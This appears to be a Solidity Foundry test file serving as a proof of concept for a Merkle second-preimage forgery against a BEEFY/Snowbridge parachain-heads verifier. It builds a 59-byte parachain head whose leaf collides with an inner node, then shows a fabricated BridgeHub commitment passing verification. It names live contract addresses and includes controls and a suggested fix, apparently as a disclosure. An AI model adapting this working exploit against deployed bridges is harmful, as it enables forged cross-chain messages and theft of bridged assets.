// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.34;

// PoC: second-preimage / node-substitution forgery of the parachain-heads Merkle proof.
//
// The parachain-heads tree that BEEFY commits to is built by the Polkadot relay chain with
// `binary_merkle_tree::merkle_root::<Keccak256, _>` over leaves that are the RAW, VARIABLE-LENGTH
// SCALE encoding of `(ParaId: u32, HeadData: Vec<u8>)`. The crate hashes those raw leaves with the
// SAME hasher it uses for inner nodes (`keccak(left ++ right)`, 64 bytes, no domain separator).
// Therefore any leaf whose PREIMAGE is exactly 64 bytes is byte-for-byte indistinguishable from an
// inner node.
//
//   leaf preimage = u32le(paraId) [4] ++ compact(len) [1 when len <= 63] ++ head_data [len]
//   4 + 1 + 59 = 64
//
// A parachain whose head data is exactly 59 bytes therefore has a leaf that the verifier will
// happily treat as the parent of two 32-byte children:
//
//   S = u32le(paraId) ++ 0xEC ++ <27 free bytes>     (the first 32 bytes -- the "left child")
//   A = <32 free bytes>                              (the last 32 bytes  -- the "right child")
//   head_data = S[5..32] ++ A                        (27 + 32 = 59 bytes)
//
// The attacker sets A to the parachain-head-leaf hash of a BridgeHub header HE FABRICATED. No hash
// grinding is required: A is chosen first and published afterwards inside his own head data.
//
// Verification.verifyCommitment then takes `pos` and `width` straight from calldata and only checks
// pos < width. Submitting (pos = 2j+1, width = 2W) makes the walker perform ONE extra fold at the
// bottom -- hash(S, A) -- which lands exactly on the attacker's real on-chain leaf, and from there
// the genuine Merkle path of index j carries the fold to the genuine parachain-heads root.
//
// BEEFY is never broken: `latestMMRRoot` in these tests is set to the HONEST MMR leaf built over the
// HONEST parachain-heads root, exactly what an honest relayer would have published.
//
// Run: forge test --match-path test/ZSecondPreimage.t.sol -vv

import {Test} from "forge-std/Test.sol";
import {Verification} from "../src/Verification.sol";
import {BeefyClient} from "../src/BeefyClient.sol";
import {BeefyClientMock} from "./mocks/BeefyClientMock.sol";
import {VerificationWrapper} from "./mocks/VerificationWrapper.sol";
import {ScaleCodec} from "../src/utils/ScaleCodec.sol";
import {SubstrateMerkleProof} from "../src/utils/SubstrateMerkleProof.sol";
import {MerkleLibSubstrate} from "./utils/MerkleLib.sol";

/// Byte-for-byte copy of the walker in the LIVE BeefyClient/Gateway
/// (0x7cfc5C8b341991993080Af67D940B6aD19a010E1 / 0x36e74FCAAcb07773b144Ca19Ef2e32Fc972aC50b),
/// i.e. the pre-#1798 version, so the PoC can show both generations are affected.
library DeployedSubstrateMerkleProof {
    function computeRoot(bytes32 leaf, uint256 position, uint256 width, bytes32[] calldata proof)
        internal
        pure
        returns (bytes32)
    {
        bytes32 node = leaf;
        unchecked {
            for (uint256 i = 0; i < proof.length; i++) {
                if (position & 1 == 1 || position + 1 == width) {
                    node = efficientHash(proof[i], node);
                } else {
                    node = efficientHash(node, proof[i]);
                }
                position = position >> 1;
                width = ((width - 1) >> 1) + 1;
            }
            return node;
        }
    }

    function efficientHash(bytes32 a, bytes32 b) internal pure returns (bytes32 value) {
        assembly {
            mstore(0x00, a)
            mstore(0x20, b)
            value := keccak256(0x00, 0x40)
        }
    }
}

/// memory->calldata bridge so the REAL on-chain library code runs
contract Walkers {
    function head(bytes32 leaf, uint256 pos, uint256 width, bytes32[] calldata proof)
        external
        pure
        returns (bool, bytes32)
    {
        return SubstrateMerkleProof.computeRoot(leaf, pos, width, proof);
    }

    function deployed(bytes32 leaf, uint256 pos, uint256 width, bytes32[] calldata proof)
        external
        pure
        returns (bytes32)
    {
        return DeployedSubstrateMerkleProof.computeRoot(leaf, pos, width, proof);
    }
}

contract ZSecondPreimageTest is Test {
    BeefyClientMock public beefyClient;
    VerificationWrapper public wrapper;
    Walkers public walkers;

    // BridgeHub on Polkadot
    uint32 constant BRIDGE_HUB_PARA_ID = 1002;
    bytes4 encodedBridgeHubID;

    // The parachain the attacker registers / controls.
    uint32 constant ATTACKER_PARA_ID = 2035;

    function setUp() public {
        beefyClient = new BeefyClientMock(
            3, 8, 16, 101, 0, BeefyClient.ValidatorSet(0, 0, 0x0), BeefyClient.ValidatorSet(1, 0, 0x0)
        );
        encodedBridgeHubID = ScaleCodec.encodeU32(BRIDGE_HUB_PARA_ID);
        wrapper = new VerificationWrapper();
        walkers = new Walkers();
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    /// SCALE `(ParaId, HeadData)` exactly as the relay chain encodes a para-heads leaf.
    function _leafPreimage(uint32 paraId, bytes memory headData)
        internal
        pure
        returns (bytes memory)
    {
        return bytes.concat(
            ScaleCodec.encodeU32(paraId),
            ScaleCodec.checkedEncodeCompactU32(headData.length),
            headData
        );
    }

    /// A realistic (>=100 byte) head for an honest parachain.
    function _honestHead(uint32 paraId) internal pure returns (bytes memory) {
        return bytes.concat(
            keccak256(abi.encodePacked("parent", paraId)), // parentHash
            hex"a63f0d00", // compact block number
            keccak256(abi.encodePacked("state", paraId)), // stateRoot
            keccak256(abi.encodePacked("extrinsics", paraId)), // extrinsicsRoot
            hex"0c", // 3 digest items
            hex"0642414245340200000000",
            hex"05424142450101",
            hex"00"
        );
    }

    /// The BridgeHub header the attacker fabricates, carrying HIS commitment as a
    /// V2 Snowbridge DIGEST_ITEM_OTHER (0x01 ++ commitment).
    function _forgedBridgeHubHeader(bytes32 commitment)
        internal
        pure
        returns (Verification.ParachainHeader memory header)
    {
        Verification.DigestItem[] memory digestItems = new Verification.DigestItem[](1);
        digestItems[0] = Verification.DigestItem({
            kind: 0, // DIGEST_ITEM_OTHER
            consensusEngineID: 0x00000000,
            data: bytes.concat(hex"01", commitment) // SnowbridgeV2 discriminator
        });
        header = Verification.ParachainHeader({
            parentHash: keccak256("forged-parent"),
            number: 9_999_999,
            stateRoot: keccak256("forged-state"),
            extrinsicsRoot: keccak256("forged-extrinsics"),
            digestItems: digestItems
        });
    }

    struct Forgery {
        bytes32 A; // forged BridgeHub parachain-head leaf hash
        bytes32 S; // left half of the attacker's 64-byte leaf preimage
        bytes attackerHead; // 59 bytes
        bytes32 honestRoot; // genuine parachain-heads root
        uint256 j; // attacker's sorted leaf index
        uint256 W; // genuine number of parachains
        bytes32[] genuinePath; // genuine merkle path of index j
    }

    /// Build the genuine parachain-heads tree of `W` paras (BridgeHub included with its GENUINE
    /// head), with the attacker's 59-byte head planted at sorted index `j`.
    function _buildForgery(uint256 W, uint256 j, bytes32 commitment)
        internal
        view
        returns (Forgery memory f)
    {
        f.W = W;
        f.j = j;
        f.A = wrapper.createParachainHeaderMerkleLeaf(
            encodedBridgeHubID, _forgedBridgeHubHeader(commitment)
        );

        // S = u32le(attackerParaId) ++ compact(59)=0xEC ++ 27 free bytes
        bytes memory sBytes = bytes.concat(
            ScaleCodec.encodeU32(ATTACKER_PARA_ID),
            hex"EC",
            bytes27(keccak256("attacker-padding"))
        );
        require(sBytes.length == 32, "S must be 32 bytes");
        f.S = bytes32(sBytes);

        // head_data = S[5..32] ++ A   (27 + 32 = 59)
        bytes memory tail = new bytes(27);
        for (uint256 i = 0; i < 27; i++) {
            tail[i] = sBytes[5 + i];
        }
        f.attackerHead = bytes.concat(tail, f.A);
        require(f.attackerHead.length == 59, "head must be 59 bytes");

        // The genuine tree: honest paras everywhere, BridgeHub's GENUINE head at index 2,
        // attacker's 59-byte head at index j.
        bytes32[] memory leaves = new bytes32[](W);
        for (uint256 i = 0; i < W; i++) {
            leaves[i] = keccak256(_leafPreimage(uint32(1000 + i), _honestHead(uint32(1000 + i))));
        }
        leaves[2] = keccak256(
            _leafPreimage(BRIDGE_HUB_PARA_ID, _honestHead(BRIDGE_HUB_PARA_ID))
        ); // BridgeHub's real head -- NOT the forged one
        leaves[j] = keccak256(_leafPreimage(ATTACKER_PARA_ID, f.attackerHead));

        f.honestRoot = MerkleLibSubstrate.rootFromLeaves(leaves);
        f.genuinePath = MerkleLibSubstrate.genProof(leaves, j);
    }

    function _forgedProofItems(Forgery memory f) internal pure returns (bytes32[] memory items) {
        items = new bytes32[](f.genuinePath.length + 1);
        items[0] = f.S;
        for (uint256 i = 0; i < f.genuinePath.length; i++) {
            items[i + 1] = f.genuinePath[i];
        }
    }

    // ------------------------------------------------------------------
    // 1. The leaf/node collision itself
    // ------------------------------------------------------------------
    function test_1_leafPreimageIsExactly64BytesAndCollidesWithAnInnerNode() public view {
        Forgery memory f = _buildForgery(50, 37, keccak256("forged-commitment"));

        bytes memory preimage = _leafPreimage(ATTACKER_PARA_ID, f.attackerHead);
        assertEq(preimage.length, 64, "attacker leaf preimage must be exactly 64 bytes");

        // The honest relay chain's leaf hash ...
        bytes32 honestLeafHash = keccak256(preimage);
        // ... is bit-for-bit the inner node keccak(S ++ A) that the Gateway's walker produces.
        assertEq(
            honestLeafHash,
            MerkleLibSubstrate.hashPair(f.S, f.A),
            "leaf hash must equal inner-node hash of (S, A)"
        );
    }

    // ------------------------------------------------------------------
    // 1b. Uniqueness sweep: L = 59 is the ONLY head length whose leaf
    //     preimage is exactly 64 bytes, and a 64-byte preimage is the
    //     necessary condition for a leaf to alias a (64-byte) inner node.
    //
    //     leaf preimage = u32le(paraId)[4] ++ compact(L) ++ head[L]
    //       compact(L) = 1 byte for L <= 63, 2 bytes for 64 <= L <= 16383
    //       => preimage length = (L <= 63 ? 5 + L : 6 + L)
    //       => == 64 iff L == 59   (5 + 59 = 64; 6 + 58 = 64 but 58 < 64)
    //
    //     This is what the report/PoC did NOT previously prove: it justifies a
    //     minimum-head-length fix (reject L < 60), which closes the collision
    //     for EVERY length, not just the one 59-byte example.
    // ------------------------------------------------------------------
    function test_1b_only59ByteHeadYieldsA64BytePreimage() public {
        uint256 count64 = 0;
        // Sweep across the 1-byte/2-byte compact boundary (at L = 64).
        for (uint256 L = 0; L <= 200; L++) {
            bytes memory head = new bytes(L);
            for (uint256 i = 0; i < L; i++) {
                head[i] = 0xAB; // content is irrelevant to preimage length
            }
            bytes memory preimage = _leafPreimage(ATTACKER_PARA_ID, head);

            // Full length formula, independently of the collision.
            uint256 expected = L <= 63 ? 5 + L : 6 + L;
            assertEq(preimage.length, expected, "preimage length formula");

            // A 64-byte preimage (the only thing that can alias an inner node)
            // occurs iff the head is exactly 59 bytes.
            assertEq(preimage.length == 64, L == 59, "64-byte preimage iff L == 59");

            if (preimage.length == 64) {
                count64++;
                assertEq(L, 59, "the unique 64-byte-preimage length is 59");
            }
        }
        assertEq(count64, 1, "exactly one head length in [0,200] is collidable (L=59)");
    }

    // ------------------------------------------------------------------
    // 2. The walker accepts (pos=2j+1, width=2W) -- BOTH generations
    // ------------------------------------------------------------------
    function test_2_bothWalkersFoldForgedLeafToTheGenuineRoot() public view {
        Forgery memory f = _buildForgery(50, 37, keccak256("forged-commitment"));
        bytes32[] memory items = _forgedProofItems(f);

        (bool ok, bytes32 rootHead) = walkers.head(f.A, 2 * f.j + 1, 2 * f.W, items);
        assertTrue(ok, "repo HEAD walker must report the proof structurally valid");
        assertEq(rootHead, f.honestRoot, "repo HEAD walker folds forged leaf to the GENUINE root");

        bytes32 rootDeployed = walkers.deployed(f.A, 2 * f.j + 1, 2 * f.W, items);
        assertEq(
            rootDeployed, f.honestRoot, "LIVE (pre-#1798) walker folds forged leaf to GENUINE root"
        );
    }

    // ------------------------------------------------------------------
    // 3. End-to-end: Verification.verifyCommitment returns TRUE for a commitment
    //    BridgeHub never made, against an HONEST BEEFY MMR root.
    // ------------------------------------------------------------------
    function test_3_verifyCommitmentAcceptsAForgedBridgeHubCommitment() public {
        bytes32 forgedCommitment = keccak256("attacker's own message-root");
        Forgery memory f = _buildForgery(50, 37, forgedCommitment);

        Verification.MMRLeafPartial memory leafPartial = Verification.MMRLeafPartial({
            version: 0,
            parentNumber: 26_000_000,
            parentHash: keccak256("relay-parent"),
            nextAuthoritySetID: 5383,
            nextAuthoritySetLen: 600,
            nextAuthoritySetRoot: keccak256("authset")
        });

        // HONEST light-client state: the MMR leaf is built over the GENUINE parachain-heads root,
        // exactly what an honest relayer publishes. Nothing about BEEFY is faked.
        bytes32 honestMmrLeaf = wrapper.createMMRLeaf(leafPartial, f.honestRoot);
        beefyClient.setLatestMMRRoot(honestMmrLeaf);

        Verification.Proof memory proof = Verification.Proof({
            header: _forgedBridgeHubHeader(forgedCommitment),
            headProof: Verification.HeadProof({
                pos: 2 * f.j + 1,
                width: 2 * f.W,
                proof: _forgedProofItems(f)
            }),
            leafPartial: leafPartial,
            leafProof: new bytes32[](0), // single-leaf MMR isolates the parachain-heads step
            leafProofOrder: 0
        });

        bool accepted = Verification.verifyCommitment(
            address(beefyClient), encodedBridgeHubID, forgedCommitment, proof, true
        );
        assertTrue(accepted, "FORGED BridgeHub commitment accepted by verifyCommitment");

        // Negative control: a different commitment must NOT verify with the same proof.
        bool other = Verification.verifyCommitment(
            address(beefyClient), encodedBridgeHubID, keccak256("something else"), proof, true
        );
        assertFalse(other, "control: unrelated commitment must be rejected");
    }

    // ------------------------------------------------------------------
    // 4. Works across tree shapes (odd/even widths, promoted positions)
    // ------------------------------------------------------------------
    function test_4_worksAcrossTreeShapes() public view {
        uint256[6] memory widths = [uint256(8), 9, 15, 40, 51, 64];
        for (uint256 k = 0; k < widths.length; k++) {
            uint256 W = widths[k];
            for (uint256 j = 3; j < W; j++) {
                Forgery memory f = _buildForgery(W, j, keccak256(abi.encodePacked("c", W, j)));
                bytes32[] memory items = _forgedProofItems(f);
                (bool ok, bytes32 r) = walkers.head(f.A, 2 * j + 1, 2 * W, items);
                assertTrue(ok, "structurally valid");
                assertEq(r, f.honestRoot, "folds to genuine root");
            }
        }
    }

    // ------------------------------------------------------------------
    // 5. Control: without the 64-byte leaf the forgery fails.
    // ------------------------------------------------------------------
    function test_5_controlNormalLengthHeadDoesNotForge() public view {
        // Same construction but the attacker's head is a normal length, so its leaf preimage is
        // not 64 bytes and its hash is not keccak(S ++ A).
        uint256 W = 50;
        uint256 j = 37;
        bytes32 commitment = keccak256("forged-commitment");
        Forgery memory f = _buildForgery(W, j, commitment);

        bytes32[] memory leaves = new bytes32[](W);
        for (uint256 i = 0; i < W; i++) {
            leaves[i] = keccak256(_leafPreimage(uint32(1000 + i), _honestHead(uint32(1000 + i))));
        }
        leaves[2] = keccak256(_leafPreimage(BRIDGE_HUB_PARA_ID, _honestHead(BRIDGE_HUB_PARA_ID)));
        // attacker uses a NORMAL head instead of the crafted 59-byte one
        leaves[j] = keccak256(_leafPreimage(ATTACKER_PARA_ID, _honestHead(ATTACKER_PARA_ID)));

        bytes32 root = MerkleLibSubstrate.rootFromLeaves(leaves);
        bytes32[] memory path = MerkleLibSubstrate.genProof(leaves, j);
        bytes32[] memory items = new bytes32[](path.length + 1);
        items[0] = f.S;
        for (uint256 i = 0; i < path.length; i++) {
            items[i + 1] = path[i];
        }

        (bool ok, bytes32 r) = walkers.head(f.A, 2 * j + 1, 2 * W, items);
        assertTrue(ok, "structurally valid but semantically wrong");
        assertTrue(r != root, "control: without the 64-byte leaf the fold misses the genuine root");
    }
}
